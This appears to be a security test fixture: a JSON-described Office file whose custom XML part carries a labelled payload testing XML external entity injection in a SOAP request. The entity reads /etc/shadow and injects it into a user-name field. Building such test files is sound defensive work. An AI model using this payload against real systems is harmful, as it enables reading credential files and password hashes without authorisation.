content:
{
  "format": "office",
  "customXml": {
    "partName": "ppt/presentation.xml",
    "content": "<root><field name="custom"># Marfaak AI Security - XXE in SOAP request

**WARNING: This payload tests XXE in SOAP request.**

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body>
<GetUser><name>&xxe;</name></GetUser>
</soapenv:Body>
</soapenv:Envelope></field></root>"
  }
}
